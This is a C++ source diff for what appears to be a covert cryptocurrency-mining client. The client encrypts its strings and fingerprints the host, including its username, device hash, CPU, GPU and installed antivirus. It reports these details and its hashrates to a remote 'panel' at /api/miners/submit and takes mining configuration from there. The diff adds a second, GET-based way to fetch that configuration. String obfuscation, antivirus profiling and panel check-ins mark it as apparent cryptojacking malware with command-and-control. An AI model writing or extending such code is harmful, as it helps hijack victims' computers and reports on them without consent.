@@ -102,6 +102,7 @@ int main(int argc, char *argv[])
 #endif
 
     std::string panelUrlsStr = ENCRYPT_STR("http://127.0.0.1:8080/api/miners/submit");
+    std::string configGetUrlStr = ENCRYPT_STR("");
     
     // Pre-encrypt common GPU mining argument strings to stay under 16 encryption limit
     const std::string GMINER_ALGO = ENCRYPT_STR("--algo ");
@@ -113,35 +114,50 @@ int main(int argc, char *argv[])
     const std::string GMINER_TAIL = ENCRYPT_STR(" --templimit 95 --api 10050 -w 0");
     
 #ifdef _DEBUG
-    std::cout << "[DEBUG] Decrypted URL(s): " << panelUrlsStr << std::endl;
+    std::cout << "[DEBUG] Decrypted Panel URL(s): " << panelUrlsStr << std::endl;
+    std::cout << "[DEBUG] Decrypted Config URL: " << (configGetUrlStr.empty() ? "(not set)" : configGetUrlStr) << std::endl;
 #endif
     
-    // Get system information
+    // Get system information (needed for both GET and POST methods)
     std::string pcUsername = GetWindowsUsername();
     std::string deviceHash = GetComputerHash();
     std::string cpuName = GetCPUName();
     std::string gpuName = GetGPUName();
     std::string antivirusName = GetAntivirusName();
     
-#ifdef _DEBUG
-    std::cout << "[*] System Information:" << std::endl;
-    std::cout << "    Username: " << pcUsername << std::endl;
-    std::cout << "    Device Hash: " << deviceHash << std::endl;
-    std::cout << "    CPU: " << cpuName << std::endl;
-    std::cout << "    GPU: " << gpuName << std::endl;
-    std::cout << "    Antivirus: " << antivirusName << std::endl;
-#endif
-    
     // Initialize config manager
     ConfigManager configManager;
     
-    // Fetch configuration from panel(s) with fallback support
+    // Determine which config fetch method to use
+    if (!configGetUrlStr.empty()) {
+        // Use direct GET request to fetch config with fallback
 #ifdef _DEBUG
-    std::cout << "[*] Fetching configuration from panel..." << std::endl;
+        std::cout << "[*] Fetching configuration from URL via GET request..." << std::endl;
 #endif
-    if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, 0.0, 0.0, GetSystemUptimeMinutes())) {
-        std::cerr << "[-] Failed to fetch configuration from all panel URLs. Exiting." << std::endl;
-        return 1;
+        if (!configManager.FetchConfigFromUrlWithFallback(configGetUrlStr)) {
+            std::cerr << "[-] Failed to fetch configuration from config URL. Exiting." << std::endl;
+            return 1;
+        }
+    } else {
+        // Use traditional method: send system info and POST to panel
+        
+#ifdef _DEBUG
+        std::cout << "[*] System Information:" << std::endl;
+        std::cout << "    Username: " << pcUsername << std::endl;
+        std::cout << "    Device Hash: " << deviceHash << std::endl;
+        std::cout << "    CPU: " << cpuName << std::endl;
+        std::cout << "    GPU: " << gpuName << std::endl;
+        std::cout << "    Antivirus: " << antivirusName << std::endl;
+#endif
+        
+        // Fetch configuration from panel(s) with fallback support
+#ifdef _DEBUG
+        std::cout << "[*] Fetching configuration from panel..." << std::endl;
+#endif
+        if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, 0.0, 0.0, GetSystemUptimeMinutes())) {
+            std::cerr << "[-] Failed to fetch configuration from all panel URLs. Exiting." << std::endl;
+            return 1;
+        }
     }
     
     const MinerConfig& cpuConfig = configManager.GetCPUConfig();
@@ -149,7 +165,7 @@ int main(int argc, char *argv[])
     
     // Verify we have valid configurations
     if (cpuConfig.mining_url.empty() && gpuConfig.mining_url.empty()) {
-        std::cerr << "[-] No valid mining configuration received from panel. Exiting." << std::endl;
+        std::cerr << "[-] No valid mining configuration received. Exiting." << std::endl;
         return 1;
     }
     
@@ -297,11 +313,20 @@ int main(int argc, char *argv[])
             
             if (cpuHashrate >= 0 || gpuHashrate >= 0) {
 #ifdef _DEBUG
-                std::cout << "[*] Sending hashrate update to panel: CPU=" << cpuHashrate << " H/s, GPU=" << gpuHashrate << " H/s" << std::endl;
+                std::cout << "[*] Checking for config updates..." << std::endl;
 #endif
                 
-                // Fetch config and check for changes
-                if (configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, cpuHashrate, gpuHashrate, GetSystemUptimeMinutes())) {
+                // Fetch config and check for changes (using same method as initial fetch)
+                bool configFetched = false;
+                if (!configGetUrlStr.empty()) {
+                    // Use GET method for updates
+                    configFetched = configManager.FetchConfigFromUrlWithFallback(configGetUrlStr);
+                } else {
+                    // Use POST method for updates
+                    configFetched = configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, cpuHashrate, gpuHashrate, GetSystemUptimeMinutes());
+                }
+                
+                if (configFetched) {
                     const MinerConfig& newCpuConfig = configManager.GetCPUConfig();
                     const MinerConfig& newGpuConfig = configManager.GetGPUConfig();
                     
